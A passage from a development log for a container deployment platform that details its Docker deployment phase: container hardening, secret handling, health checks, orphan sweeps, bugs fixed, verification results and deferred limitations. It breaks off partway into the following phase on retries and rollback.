| … a build that sleeps forever | ✅ `BUILD_TIMEOUT` 5 502 ms end to end |
| … a build that traps and ignores `SIGTERM` | ✅ SIGKILL landed; 7 174 ms end to end; "caught SIGTERM, ignoring it" is in the log |
| … a build whose grandchild traps `SIGTERM` and keeps stdout open | ✅ the grandchild died with the group — no orphan |
| … the stored log of a killed build | ✅ 1 266 bytes, keeps the output and records "timed out after" |
| **Graceful shutdown mid-build** (SIGTERM with a build running) | ✅ **9/9** |
| … the deployment | ✅ `failed` / `BUILD_ABORTED` / "…because the worker is shutting down" |
| … the build's process tree (3 pids before the signal) | ✅ empty afterwards |
| … the sandbox, and the partial log | ✅ cleaned up; log still stored |
| **Concurrent builds** (`WORKER_CONCURRENCY=2`, two projects at once) | ✅ **12/12** |
| … peak sandboxes on disk while both ran | ✅ exactly 2, one each |
| … each timeline | ✅ complete, and free of the other build's lines |
| … log objects | ✅ one per deployment, different keys, different bytes |
| **Sandbox housekeeping** | ✅ **5/5** — a 30-day-old sandbox pruned, a fresh one kept, `.npm-cache` kept |
| **Browser E2E (headless Chrome via CDP)** | ✅ **19/19**, 0 console errors |
| … `$ npm install` rendered live | ✅ **264 ms** after the Deploy click |
| … real build stdout through to its last line, in order | ✅ |
| … `out` / `err` / `···` stream tags, all six stages, both exit codes | ✅ |
| … the secret value / any host path in the rendered page | ✅ neither appears |
| … `/events` REST polls while the socket is open | ✅ **0** |
| … the "Download the full log (4.3 KiB)" link once it settles | ✅ |

### Not done / deferred on purpose

- **Still no Vitest suites.** Six phases of accumulated test debt. Verification is scratchpad scripts
  (now sixteen of them, ~230 assertions) plus the CDP browser suite. This remains the project's
  biggest gap and it is growing, not shrinking.
- **The sandbox is containment, not isolation.** A build runs as the worker's user with full
  filesystem access and unlimited memory, CPU and pids; what is enforced is that *our* paths cannot
  be escaped through an archive, a `root_dir` or a command. Resource limits and a non-root user are
  Phase 7's container, and until then a hostile build can still exhaust the host.
- **No per-deployment total timeout**, only per step. A pipeline that stalls between steps (a hung
  Postgres write, say) is bounded only by BullMQ's stalled-job detection.
- **No cancel.** A running build cannot be stopped from the dashboard; the only interruptions are the
  step deadline and worker shutdown. `canceled` exists in the state machine with nothing driving it.
- **Git sources are still unimplemented** — `GIT_SOURCE_UNSUPPORTED`.
- **No artifact is produced from the build output.** Phase 3's `gzipObject` is ready and Phase 7 will
  package `dist/`; Phase 6 stores only the log.
- **Replay past `BUILD_MAX_LOG_EVENTS` is impossible.** Beyond the cap a reconnecting dashboard cannot
  recover the missing lines from `deployment_events`; it has to download the stored log. The
  `deployment:<id>:logtail` Redis list in `REDIS_KEYS` is still unused, and remains the obvious way to
  make a bounded tail replayable cheaply.
- **The dashboard renders only the last 2 000 lines** and does not virtualise. A 50 000-line build is
  readable through the download link, not in the box.
- **Extraction limits are global, not per project or per org.** `BUILD_MAX_EXTRACT_BYTES` /
  `_FILES` apply to everyone; there is no per-plan quota.
- **`npm`'s own paths are only partly masked.** The sandbox and storage roots are replaced, but
  `npm_config_prefix` still names the Node installation directory, which arrives through the `PATH`
  we deliberately pass. Masking that too would mean masking `PATH` itself.
- **Log lines carry no ANSI colour.** `NO_COLOR=1` / `FORCE_COLOR=0` are injected because escape
  codes would be persisted verbatim into `deployment_events` and render as noise. A colour-aware log
  view would need to keep them and parse them client-side.

### Next up — Phase 7 (Docker deployment via `dockerode`)

The build now produces a real, built tree in a sandbox that Phase 7 turns into a running container.
Three of its pieces are already in place and shaped for it: `deploy-pipeline.ts` keeps
`creating_container` / `starting` / `health_check` as explicit stages with the same transitions and
events, so replacing their bodies changes nothing else; `LogSink` is a `Writable` fed by
`consumeStream()`, so a demuxed container log stream plugs into the same dual-write and the same
socket; and `BuildSandbox` already hands out a validated absolute workdir, which is what a bind mount
(or a `docker build` context) needs. The work is `creating_container` → build or prepare an image and
create a container with memory, CPU and pids limits, non-root, no host network; `starting` → start it,
map a host port, stream demuxed logs; `health_check` → poll `health_path` until 2xx or
`health_timeout_ms`; then `live` with `container_id`, `url` and `host_port` filled in, plus stop/remove
and the Redis `lock:project:<id>` that makes "one live container per project" true. The two things to
watch: container cleanup has to be as reliable as the sandbox cleanup is now — `finally` on every
path, plus a boot-time sweep of orphans like `pruneStaleSandboxes` — and the artifact story arrives
here, because a rollback (Phase 8) needs a *stored* image or tarball to go back to, not a sandbox
that has already been deleted.

---

## Phase 7 — Docker deployment via `dockerode` ✅

**Goal:** run the built app in a container and go truly LIVE.
**Completed:** 2026-09-07.

### What shipped

**`packages/shared`**
- `src/containers.ts` (new) — the names and shapes more than one process has to agree on:
  `FORGE_LABELS` (`forge.managed` / `.deployment` / `.project` / `.org` / `.attempt`),
  `containerNameFor()`, `imageRepositoryFor()` / `imageTagFor()` (with a `dockerSafe()` fold,
  because a Docker repository component is far stricter than our slugs), `containerStatsSchema`,
  `containerSummarySchema`, and the `container-actions` job + result schemas.
- `constants.ts` — `QUEUE_NAMES.containerActions`, `CONTAINER_ACTION_JOB_NAME`,
  `REDIS_KEYS.containerStats()`, `REDIS_KEYS.containerMonitorLock`.

**`packages/config`** — twenty-three `DOCKER_*` variables, all documented in `.env.example`:
socket, base image and whether to pull it, image prefix, network, host IP, the four limits
(`MEMORY_MB`/`CPUS`/`PIDS_LIMIT` + `READONLY_ROOTFS`/`TMPFS_MB`), four timeouts, stop grace,
runtime-log cap, stats interval/TTL, context cap, artifact toggle, image retention, and the two
project-lock knobs. `DEPLOY_STAGE_DELAY_MS` was **removed** — it existed only to pace the
simulated container stages, which no longer exist.

**`packages/db`**
- `repositories/deployments.ts` — `listRunningDeployments()` (the sweeper's and the sampler's
  view of "should be running"), `listOrgRunningDeployments()` (joined to the project fields the
  containers view needs, so a 3-second poll is one query), `findActiveDeployment()` and
  `clearActiveDeploymentIf()` — the last one conditional, so a stop racing a deploy cannot
  un-point a project from the *new* container.

**`packages/queue`** — split, because a second queue arrived
- `src/runtime.ts` (new) — the config, the operation deadline, the default job options and the
  borrowed-connection set now live in one place rather than inside `deployments-queue.ts`.
- `src/container-actions-queue.ts` (new) — the `container-actions` queue: producer, stats and a
  consumer factory with its own concurrency.
- `src/close.ts` (new) — one `closeQueue()` that releases both queues plus every connection
  BullMQ borrowed, so a third queue never means a third line in two shutdown paths.

**`packages/storage`** — `gzipPathToObject()`: gzip a file the caller vouches for into a stored
object. The build context lives under `BUILD_ROOT`, not `STORAGE_ROOT`, so `gzipObject`'s
key-derived containment proof does not apply; the sandbox's own `resolveInside()` is the proof
instead. It saves copying a `node_modules` tarball into the store just to compress it.

**`apps/worker`** — the phase, in `src/docker/`
- `client.ts` — one `dockerode` handle (honouring `DOCKER_HOST` when set), `pingDocker()`, and
  `reportDockerAvailability()`, which **logs rather than exits**: a worker without Docker can
  still clone, install and build, and failing at `creating_container` with a stated reason beats
  refusing to boot. `dockerUnavailable()` turns ECONNREFUSED/ENOENT/EACCES into
  `DOCKER_UNAVAILABLE` so the socket path never reaches an API response.
- `log-demux.ts` — the hand-written demultiplexer (CLAUDE.md §4). A non-TTY container hands back
  **one** socket carrying both streams in 8-byte-framed records
  (`[type][000][uint32 length][payload]`); this un-interleaves them into two `Readable`s and
  leaves line-splitting to `LineSplitter`, because a frame is not a line and a line is not a
  frame. Backpressure is preserved end to end, and the `drain` wait races `close` — see bugs, #1.
- `context.ts` — `writeDockerfile()` generates the Dockerfile (`FROM <base>`, the `forge.*`
  labels as `LABEL` instructions, `COPY --chown`, `USER 1000:1000`, `HOME`/`TMPDIR`/npm cache
  pointed at the tmpfs, `EXPOSE`, `CMD` in exec form from the same non-shell `parseCommand()` the
  build steps use) and `createBuildContext()` tars the workdir into the sandbox with the byte cap
  enforced *while* writing.
- `image.ts` — `ensureBaseImage()` (pulling off by default, so an offline demo fails with a
  sentence instead of hanging on a registry), `buildDeploymentImage()` streaming the Engine's
  NDJSON progress through `LineSplitter` into the same `LogSink` the build wrote to, and
  `pruneProjectImages()` keeping the newest `DOCKER_KEEP_IMAGES` per project.
- `container.ts` — `ensureDeploymentNetwork()` (a dedicated user-defined bridge, created on
  demand; `host` refused outright), `createDeploymentContainer()` with every §8 limit,
  `startContainer()`, `inspectContainer()`, `stopAndRemoveContainer()` (never throws — it runs in
  `finally` while another error is propagating), `removeContainerByName()`, `restartContainer()`,
  `sampleContainerStats()` and `listManagedContainers()` (by label, not by name).
- `container-logs.ts` — `followContainerLogs()`: Engine socket → demux → `LineSplitter` →
  a shared `LineBudget` → the deployment's `LogSink`. Started *before* the health check and read
  *during* it, which is why a crash-looping app shows its stack trace in the browser.
- `health-check.ts` — `probeHealth()` / `waitForHealthy()`: our own HTTP poll through the
  published host port, with a `precondition` hook the pipeline uses to fail fast on a container
  that has already exited or been OOM-killed.
- `sweep.ts` — `sweepOrphanContainers()`: the container equivalent of `pruneStaleSandboxes`.
  Postgres decides, not age — a container is ours to remove when no *running* deployment claims
  it — which is what makes it safe with several workers.
- `pipeline/container-stages.ts` (new) — `creating_container` / `starting` / `health_check` for
  real, replacing the simulated block. Owns the container it creates until it returns, and every
  exit path that is not a success removes it.
- `services/project-lock.ts` (new) — the hand-rolled `lock:project:<id>`: `SET NX PX` to take it,
  a Lua compare-and-`PEXPIRE` to renew, a Lua compare-and-`DEL` to release, plus
  `tryPeriodicLease()` for the stats sampler's much weaker "one worker per tick" election.
- `services/container-stats.ts` + `services/container-monitor.ts` (new) — samples every running
  container into Redis under a TTL, leader-elected per tick.
- `container-processor.ts` (new) — the `container-actions` consumer: `stop` (remove the container,
  clear the pointer conditionally, `live → stopped`) and `restart` (bounce it in place, re-read
  the port, re-run the health check).
- `pipeline/deploy-pipeline.ts` — takes the project lock before anything is created, calls the
  container stages, then does the swap **in this order**: read what the project points at *now* →
  write `live` → move the pointer → take the old container down. Releases the lock in `finally`,
  and removes its own container if anything after the container stages fails.
- `build/build-env.ts` — `containerEnvironment()` alongside `buildEnvironment()`.
- `main.ts` — reports Docker at boot, sweeps orphan containers, runs the second BullMQ worker and
  the stats monitor, and on shutdown stops the monitor and both consumers while **leaving live
  containers running**.

**`apps/api`** (version `0.7.0`)
- `services/container-service.ts` (new) — `getOrgContainers()` (Postgres for what should be
  running, one Redis `MGET` for the samples) and `requestContainerAction()` (validate, enqueue,
  return; it writes no transition itself, because the worker's execution is what produces one).
- `routes/deployments.ts` — `GET /orgs/:orgId/containers`, and
  `POST …/deployments/:deploymentId/stop` / `…/restart`, both `member`-gated and rate-limited.

**`apps/dashboard`**
- `app/orgs/[orgSlug]/containers/page.tsx` (new) + a **Containers** nav entry — one card per
  running container: the app URL as a link, the container id and image tag, Restart/Stop, and
  CPU / memory / processes as labelled meters that turn amber past 70% and red past 90%.
- `components/deployments-panel.tsx` — a live-URL callout on the selected deployment with the
  container id, host port and the same Restart/Stop buttons; an **Artifact** download link
  alongside the log one.

### Decisions & assumptions

- **Docker assigns the host port; we read it back.** Publishing with an empty `HostPort` is
  race-free by construction. Choosing one ourselves would mean either a Redis reservation that
  leaks when a worker dies, or a bind that races another process between "is it free?" and
  "bind" — and the daemon already does that atomically. The cost is that a `docker restart`
  republishes on a *new* port, which is a real property of ephemeral publishing rather than
  something to hide: the restart path reads the new binding and persists it. A URL stable across
  restarts needs a proxy in front, which is Phase 12's `*.localhost` routing. See bugs, #2.
- **The image is the artifact.** It is what a container is created from now and what Phase 8's
  rollback re-creates one from later, which is why the tag carries the deployment id *and* the
  attempt (a retry must not overwrite the only image a rollback could go back to) and why images
  are pruned by count, after a deployment is proven, never before.
- **Secrets are passed to `container create`, never `ENV`'d into the image.** An image layer is a
  durable, exportable artifact: a secret baked into one outlives the deployment and leaves with
  `docker save`. Container environment lives exactly as long as the container. This is the
  Phase 7 equivalent of Phase 6's "the build environment is built from nothing".
- **`Tty: false`, deliberately.** A TTY would merge stdout and stderr into one raw stream and
  lose the distinction the dashboard colours by. The price is that the log stream is multiplexed,
  which is why `log-demux.ts` exists — and demultiplexing it by hand is the §4 learning goal, so
  `dockerode`'s own `demuxStream` is not used.
- **The health check is ours, not Docker's.** A Dockerfile `HEALTHCHECK` runs *inside* the
  container: it proves the process is up but not that the port mapping works, and its result
  only arrives through `inspect` polling. Going through the published host port tests the whole
  path a browser will take, which is what "live" should mean.
- **A `precondition` on every health-check attempt.** Polling a dead container for thirty seconds
  and then reporting a timeout sends the reader looking in the wrong place. The pipeline checks
  the container's state between attempts, so an app that exits reports "the container exited with
  code 3" in under three seconds, and an OOM kill says so by name.
- **The swap order is read-pointer → write `live` → move pointer → remove old.** Any other order
  either leaves two containers claiming to serve or leaves a moment where the project points at
  nothing. The consequence, stated plainly: for the ~1s between the new container going live and
  the old one being removed, **two containers exist for one project**. `active_deployment_id` is
  unambiguous throughout, and the alternative is downtime on every deploy.
- **`stop` removes the container; the image stays.** A stopped-but-present container still holds
  its name and its published port, and it would make the sweeper's "should this be running?"
  test ambiguous. Keeping the image is what makes Phase 8's "start it again from the stored
  image" possible.
- **`restart` does not transition.** The state machine has no `live → starting` edge and
  inventing one would make `starting` mean two things. A restart bounces the same container and
  re-runs the health check, so the deployment never stopped being live; `live` is re-recorded
  with `force` to carry the new URL and to put the restart in the timeline. A failed restart is a
  real failure and is recorded as one.
- **Stop/restart is a queued job, not a route calling Docker.** ARCHITECTURE §9 says the API
  never imports Docker, and that rule is what keeps the "workers own the Docker host" story
  honest. It rides its **own** queue rather than `deployments`: operationally a stop must not sit
  behind a five-minute build, and structurally the deployments queue's semantics (job id =
  deployment id, one attempt, idempotent per deployment) are exactly wrong here — two stops of
  one deployment are two legitimate requests. Those semantics are also what CLAUDE.md §13 says
  not to change, so they were left alone.
- **Container stats go to Redis and are polled over REST, not published on the `metrics` topic.**
  The gateway validates `metrics`-topic payloads as `metricMessageSchema` and every *other* topic
  as `deploymentMessageSchema`, so a container metric could only travel on the global `metrics`
  topic — which any member of any org may watch. Per-container samples keyed by deployment id on
  a cross-tenant channel is a leak, and widening the deployment message union is a WS contract
  change (§13). Phase 9 owns the metrics publisher and can do it properly with a scoped frame.
- **The sampler is leader-elected per tick.** Without it, N workers each poll
  `/containers/{id}/stats` for every live container on every tick and write the same document N
  times. `tryPeriodicLease` has deliberately weaker guarantees than `ProjectLock` — no renewal,
  no ownership check on release — because nothing breaks if two workers sample the same container
  in the same second.
- **The orphan sweep asks Postgres, not the clock.** `pruneStaleSandboxes` is age-based because
  another live worker may own a sandbox right now. A container carries a label, so the sharper
  test is available: remove it when no deployment in `creating_container`/`starting`/
  `health_check`/`live` names it. Those in-progress statuses are in the list precisely so a
  container another worker created ninety seconds ago is protected by its row rather than by
  luck. The sweep passes `graceSeconds: 0` — an orphan has no claim on a graceful shutdown, and
  N of them at boot must not serialise into N × 10s.
- **A dedicated user-defined bridge (`forge-deployments`), and `host` refused.** Deployments are
  off the network our own Postgres and Redis containers sit on, so they cannot resolve
  `forge-postgres`. Verified. What it does *not* do is block the host gateway IP — see the
  deferred list.
- **`Init: true`.** Docker's tini as PID 1, because otherwise PID 1 is the project's start
  command — commonly `npm`, which neither reaps zombies nor forwards signals well. Added after
  watching `docker stop` produce "npm error signal SIGTERM" instead of a clean shutdown.
- **The build context is written to a file, not piped straight to the daemon.** It has two
  consumers (the image build and the stored artifact) and a file gives the size up front, which
  is what lets a runaway context be refused before the daemon starts reading it.
- **No migration.** `image_tag`, `container_id`, `url` and `host_port` have been on `deployments`
  since Phase 4, and `files.kind` already had `'artifact'`. Nothing in this phase needed a schema
  change, which is why there is no §13 stop-and-ask in it.
- **`networkmode: none` for the image build.** Safe only because the generated Dockerfile has no
  `RUN` step: install and build already happened on the host under `spawn`, so image assembly is
  pure `COPY`.
- **Labels are `LABEL` instructions, not the build endpoint's `labels` parameter.** That parameter
  is a JSON-encoded query string and getting it wrong fails *silently* — which it did, until a
  re-read of the code found the comment claiming labels lived in the Dockerfile while the
  Dockerfile had none. As instructions they are part of the build and readable back with
  `docker inspect`, which is what makes an image identifiable as ours without matching its name.

### Bugs found and fixed during verification

1. **The deployment hung one step short of `live` — the demuxer used `.pipe()`.** The health
   check passed, the container was serving happily, and the row sat in `health_check` forever with
   its sandbox on disk. `source.pipe(sink)` only ends the destination when the source emits
   `end`, and the Engine log socket never does: it is *destroyed*, by `stop()` once the health
   check settles. A destroyed source leaves a piped destination open, so the demuxer's two
   `PassThrough`s never ended, both branch pipelines stayed pending, and the `finally` that awaits
   them never returned. Fixed by using `stream.pipeline`, which propagates destruction in both
   directions (and treats `ERR_STREAM_PREMATURE_CLOSE` as the expected teardown).

   The same teardown had a second, narrower version of the bug: `writeTo()` awaited `drain` on a
   target that could be destroyed *while* it waited. The wait now races `drain` against `close`.
2. **A restart left the recorded URL pointing at a dead port.** `docker restart` republishes an
   ephemeral `HostPort`, so the container came back on `:32773` while `deployments.url` still said
   `:32772`. The restart's own health check passed — it read the new binding — so nothing looked
   wrong until something followed the recorded URL. The port and URL are now read back and
   persisted, and `live` is re-recorded so the dashboard sees it. This is the finding that turned
   "restart keeps the URL" from an assumption into a documented limit.
3. **A shutdown mid-health-check was reported as an unhealthy app.** `waitForHealthy` returned
   `ok: false` on abort like any other failure, so a worker leaving produced
   `HEALTH_CHECK_FAILED` — the same code an app that genuinely does not work gets, and Phase 8's
   retry would have to guess which it was. It now reports `aborted` separately and the stage
   throws `StepAbortedError`, which normalises to the same `BUILD_ABORTED` the build steps use.
   `buildDeploymentImage` was given the same treatment.
4. **The boot sweep could stall for 10s per orphan.** `container.stop({ t })` is a maximum, not a
   wait — but a container that ignores SIGTERM costs the full grace, and the sweep runs before the
   worker consumes anything. Found by planting two busy-loop `sh` containers and watching a
   14-second test window cut the sweep off mid-removal. The sweep now passes `graceSeconds: 0`.

**Three harness bugs worth recording, since two of them looked like product failures:**
the first suite asserted `#1 was stopped` immediately after `#2` went live — but the retire
happens *after* the swap by design, so the test was racing a documented ordering rather than
finding a bug; the dashboard's `next dev` server started 404ing its own chunks because running
`pnpm build` overwrote `.next` underneath it; and the browser suite's login failed silently
because the API's CORS allowlist is `http://localhost:3000` and the harness was serving the
dashboard on `:3100`. The browser run therefore uses an isolated pair — API on `:4100` with
`CORS_ORIGIN=http://localhost:3100`, dashboard production build on `:3100` — rather than
loosening the allowlist.

### Verification (all run on 2026-09-07)

Scratchpad scripts driving the real stack (Postgres + Redis + API + two workers + Docker 29.6.0,
base image `node:22-alpine`). Counts are the scripts' own assertions.

| Check | Result |
|---|---|
| `pnpm typecheck` | ✅ clean across all 8 workspaces |
| `pnpm lint` | ✅ clean |
| `pnpm build` | ✅ 5 packages + api + worker (tsc) + dashboard (`next build`, 10 routes) |
| **Happy path** — upload → deploy → open the URL | ✅ **70/70** |
| … all nine stages recorded in order, event ids strictly increasing | ✅ 131 events |
| … `container_id`, `image_tag`, `host_port`, `url`, `duration_ms` all filled in | ✅ 2 487 ms end to end |
| … `GET http://localhost:<port>/hello` against the deployed app | ✅ 200, echoes the path |
| … the app sees its non-secret env var and its own `FORGE_DEPLOYMENT_ID` | ✅ |
| … the *image* carries the same `forge.*` labels as the container | ✅ emitted as `LABEL` instructions |
| … `projects.active_deployment_id` points at it | ✅ |
| **Container limits, read back from `docker inspect`** | ✅ 16/16 |
| … memory 512 MiB, `MemorySwap` equal to it (swap off), 1 CPU, 256 pids | ✅ |
| … `CapDrop: ["ALL"]`, `no-new-privileges:true`, read-only root fs | ✅ |
| … tmpfs `/tmp` `rw,noexec,nosuid,size=64m`, user `1000:1000` | ✅ |
| … network `forge-deployments` (not `host`), `RestartPolicy: no`, `Tty: false` | ✅ |
| … port published on `127.0.0.1` only; labels carry the deployment | ✅ |
| **Secrets** | ✅ the image's `Env` has no project variable at all; the container's has the secret; neither has `DATABASE_URL`, `REDIS_URL` or `ENCRYPTION_KEY` |
| **The stored log** | ✅ 7 889 bytes: `$ npm install`, `$ docker build`, the generated Dockerfile, `Step 1/12`…, the health-check attempts, `Live at http://localhost:…`, and the container's own `hello-forge listening on 3000` |
| … the secret value / any `/home/...` path in it | ✅ neither appears |
| **The artifact** | ✅ 2 027 bytes gzipped from 11 776 (17.2%) on a worker thread, `kind='artifact'`, downloadable |
| **`GET /orgs/:id/containers` + stats** | ✅ CPU 0.6%, memory 32 161 792 / 536 870 912, 22 pids, docker state `running` |
| **Lifecycle** | ✅ **40/40** |
| … restart: same container id, new host port, row updated to match `docker inspect`, serves again | ✅ 32774 → 32775 |
| … the restart appears in the timeline as its own event | ✅ "Restarted and healthy again at …" |
| … deploy #2: #1 → `stopped`, its container removed, project re-pointed | ✅ exactly one container per project afterwards |
| … stop: `stopped`, container gone, `url`/`host_port` cleared, pointer cleared, image kept | ✅ |
| … restart a stopped deployment | ✅ `409 NOT_LIVE` |
| … stop it twice | ✅ `200` with `enqueued: false` — not an error |
| … a `viewer` can list containers but not stop one | ✅ `200` / `403` |
| **Failure paths** | ✅ **47/47** |
| … injected failure at each of the three container stages | ✅ correct code, timeline shows how far it got, **no container left behind** |
| … an app that exits immediately | ✅ `HEALTH_CHECK_FAILED` "the container exited with code 3" in **2 868 ms**, not 30 s |
| … its stdout and stderr, through the hand-written demuxer | ✅ arrived on the timeline **tagged separately** |
| … an app that listens on the wrong port (6 s budget) | ✅ failed after 6 996 ms naming the budget |
| … an app that prints its whole environment at runtime | ✅ `RUNTIME_SECRET=«redacted»`; the value absent; the key name still readable |
| … the worker's own env in that dump | ✅ no `DATABASE_URL`, no `ENCRYPTION_KEY` |
| … an app that allocates 4 GiB | ✅ "killed for exceeding its 512MB memory limit" |
| … from *inside* a live container | ✅ `id -u` = 1000; `touch /` and `touch /app` fail; `touch /tmp` works; `forge-postgres` does not resolve |
| **Concurrency & the project lock** | ✅ **15/15** |
| … the same request twice, in parallel | ✅ one `202` + one `200`, one deployment, **one container** |
| … two *different* deployments of one project, in parallel | ✅ one live at the end, one `stopped`, one container running |
| … their `creating_container`→settle windows | ✅ **did not overlap** (…142855–144217 then …144872–146366) — the lock serialised them |
| … image retention | ✅ 3 tags kept under `DOCKER_KEEP_IMAGES=5`, including the live one |
| **Graceful shutdown mid-health-check** | ✅ **10/10** |
| … SIGTERM to the worker that held the job | ✅ `failed` / `BUILD_ABORTED` / "…because the worker is shutting down" |
| … the container | ✅ removed, not orphaned; no container carries the label |
| … the partial build log | ✅ still stored (4 646 bytes); the worker exited and left the fleet |
| **Orphan container sweep** | ✅ 3 planted orphans removed (unknown deployment, no deployment label, a deployment pointing elsewhere) |
| … the one genuinely-live container alongside them | ✅ untouched, still answering `200` |
| **Browser E2E (headless Chrome via CDP)** | ✅ **33/33**, 0 console errors, 0 page exceptions |
| … run against an isolated pair — API `:4100` with `CORS_ORIGIN=http://localhost:3100`, dashboard **production** build on `:3100` | ✅ the same workers, the same database |
| … the project page | ✅ app URL as a link, container id, host port, Restart + Stop, Artifact + log downloads |
| … the replayed build log in the browser | ✅ `Step 1/12 : FROM node:22-alpine`, `listening on 3000`, `Live at http://localhost:…` |
| … the containers page | ✅ CPU %, `25.7 MiB / 512.0 MiB`, `19 / 256` pids, `<hostPort> → 3000`, "active" badge, Open link |
| … clicking **Stop** in the browser | ✅ list empties, row `stopped`, container gone from the host |
| … the secret value / any host path in either page | ✅ neither appears |

### Not done / deferred on purpose

- **Still no Vitest suites.** Seven phases of accumulated test debt. Verification is scratchpad
  scripts (now twenty-two of them, ~445 assertions) plus the CDP browser suite. This remains the
  project's biggest gap and it is still growing.
- **A container can reach host services through the Docker gateway IP.** The dedicated bridge
  stops a deployment resolving `forge-postgres` by name — verified — but `172.x.0.1:5433` is
  still routable from inside it. Closing that needs firewall rules (or an `internal: true`
  network, which would also break published ports), and it is the honest limit of the network
  isolation in this phase.
- **The build still runs on the host.** `npm install` and `npm run build` execute as the worker's
  own user with no resource caps; only the *running app* is contained. Building inside a
  throwaway container is the obvious next step and would make the sandbox's remaining exposure
  moot.
- **Runtime logs are followed only until the health check settles.** Once a deployment is `live`
  its container's output is no longer streamed anywhere — `deployment_events` is a
  *deployment's* timeline, not a running app's log. Reading a live container's logs needs its own
  endpoint, and since the API cannot call Docker it needs a worker-side path to get them.
- **The URL changes when a container restarts** (see decisions). A stable per-project URL is
  Phase 12's `*.localhost` reverse proxy.
- **`DOCKER_BASE_IMAGE_MISSING` is untested.** The code path is there and the message names the
  `docker pull` to run, but exercising it needs a worker configured with a bogus base image while
  no other worker can win the job, which this session's shared queue made impractical.
- **No cancel, still.** `canceled` remains in the state machine with nothing driving it, and a
  running container cannot be interrupted from the dashboard except by Stop (which only applies
  once it is live).
- **No per-deployment total timeout**, only per stage.
- **Image pruning is per project and count-based only.** There is no global disk budget, no
  dangling-layer prune, and no per-org quota; a hundred projects will hold five images each.
- **The stats sampler polls `/containers/{id}/stats` once per container per tick.** With many
  live containers that is a linear number of Engine requests every three seconds. Docker's
  streaming stats endpoint would be cheaper, and Phase 9 is where that belongs.
- **The container-actions queue has no retry and no dead-letter hop.** One attempt, deliberately:
  a stop that failed because Docker was down should surface as something the user can click
  again. Phase 8 decides whether it deserves the same treatment as deployments.
- **Git sources are still unimplemented** — `GIT_SOURCE_UNSUPPORTED`.
- **A project cannot supply its own Dockerfile.** Ours is generated and overwrites
  `.forge.Dockerfile` in the build tree if a project happens to ship that name. Honouring a
  project-supplied Dockerfile is a feature with its own security surface (arbitrary `RUN` steps,
  arbitrary base images), not a naming decision.
- **`DOCKER_MAX_RUNTIME_LOG_LINES` is a shared budget across both streams** and is not per
  second, so an app that logs steadily during a 30-second health check can spend it before going
  live and lose the tail.

### Next up — Phase 8 (retries, rollback, idempotency, dead-letter)

Everything Phase 8 needs to go back to is now recorded. A previous deployment keeps its
`image_tag` (pruning keeps `DOCKER_KEEP_IMAGES` per project and runs only *after* a new
deployment is proven) and its gzipped build context as a `kind='artifact'` object, so a rollback
has both a runnable image and reproducible bytes even though the sandbox is long gone. `stop`
already removes a container without touching its image, which makes "create a container from a
prior deployment's image, health-check it, swap the pointer, stop the old one" a re-use of
`createDeploymentContainer` + `waitForHealthy` + the swap block in `deploy-pipeline.ts` rather
than new machinery — under the same `lock:project:<id>` that already serialises going live.
`StageError` carries `retryable`, and the three container failures set it deliberately: a health
check that timed out and a `PROJECT_LOCKED` are retryable, a build that exited non-zero is not.
Two things to watch: `forgetDeploymentJob` has to be called before re-enqueuing an existing
deployment (BullMQ silently ignores an `add` for a job id it still holds), and a rollback creates
a *new* deployment row with `parent_deployment_id` set — which means `container-stages.ts` needs
a path that skips `cloning`/`installing`/`building` entirely and enters at
`creating_container` with an image that already exists.

---

## Phase 8 — Retries, rollback, idempotency, dead-letter ✅

**Goal:** the resilience story — a failure retries itself, a bad deployment can be undone, and a
duplicate click is never a duplicate container.
**Completed:** 2026-09-07.

### What shipped

**`packages/shared`**
- `deployments.ts` — two new edges in `DEPLOYMENT_TRANSITIONS`: `assigned → creating_container`
  (a rollback that reuses an image has nothing to clone, install or build) and
  `cloning → creating_container` (a rollback that had to extract the target's artifact — that
  extraction *is* the clone; install and build are still baked into the artifact).
  `ROLLBACK_SKIPPED_STAGES` names which stages each of the two paths skips, so the dashboard can
  render them as deliberately-not-run rather than lost.
- `deploymentSchema` gained `maxAttempts` and `deadLetteredAt`; `createRollbackSchema`,
  `rollbackTargetSchema`, `retryResultSchema`, `deadLetterJobSchema` and `deadLetterEntrySchema`
  are new. `fleetSchema` gained `deadLetter` and `containerActions` (additive — the only consumer
  is our own dashboard).
- `constants.ts` — `DEAD_LETTER_JOB_NAME`, and `QUEUE_NAMES.deploymentsDlq` documented as a
  parking lot with nothing consuming it.

**`packages/config`**
- `DEPLOY_JOB_ATTEMPTS` default **1 → 3**, and `DEPLOY_DLQ_KEEP` (1000) added. Both documented in
  `.env.example`, which now states the rule the number obeys: the budget applies to *retryable*
  failures only.

**`packages/db`**
- Migration `1757500000000_deployment-retries.ts` — `deployments.max_attempts` (not null,
  default 1, checked 1–100) and `deployments.dead_lettered_at`, plus a **partial** index
  `idx_deployments_rollback_targets` over `(project_id, created_at DESC) WHERE status IN
  ('stopped','rolled_back')`. No data migration needed: existing rows really did run under a
  budget of one and really were never dead-lettered, so the defaults are the truth.
- `claimDeployment()` no longer takes an `attempt` — it does `attempt = attempt + 1` **in SQL**
  inside the same conditional update. The row is re-run from two independent places (BullMQ's own
  retry, which knows `attemptsMade`, and a manual re-enqueue, which starts a fresh job at 0), so
  deriving the counter from the queue would reset it on every manual retry.
- `requeueForRetry(id, freshAttempts)` — conditional on `status = 'failed'`, clears the previous
  attempt's outcome, and re-bases `max_attempts` to `attempt + freshAttempts` so it stays what it
  claims to be: the ceiling on `attempt`.
- `markDeadLettered()`, and `listRollbackTargets()` — the candidate query, with the `live` event
  timestamp and the artifact id/size as scalar subqueries.

**`packages/queue`**
- `src/dead-letter-queue.ts` (new) — the `deployments-dlq` producer, with `enqueueDeadLetter()`
  (jobId `<deployment>_a<attempt>`, so the hop is idempotent), `listDeadLetters()`,
  `discardDeadLetter()`, `getDeadLetterStats()` and a hand-rolled `trim()`
  (`removeOnComplete`/`removeOnFail` only fire when a job is *processed*, and nothing processes
  this queue).
- `UnrecoverableError` re-exported, so the worker can end a job's retries without importing
  BullMQ directly (CLAUDE.md §11).
- `closeQueue()` releases the third queue too.

**`apps/worker`**
- `processor.ts` — the retry decision. It tells BullMQ one of three things: rethrow (retryable,
  budget left → backoff and re-deliver), throw `UnrecoverableError` (this failure will fail
  again → abandon the remaining attempts), or return. Either failure path records `failed` first,
  and the terminal one parks the job in the DLQ. The automatic re-queue now also **clears the
  previous attempt's outcome columns** — see bugs, #2.
- `pipeline/deploy-pipeline.ts` — split into `prepareBuild()` (clone → install → build, lifted
  out verbatim) and `prepareRollback()` (reuse the target's image if it is on this host, else
  extract its stored artifact and rebuild). Both return an `ImageSource`, and everything below —
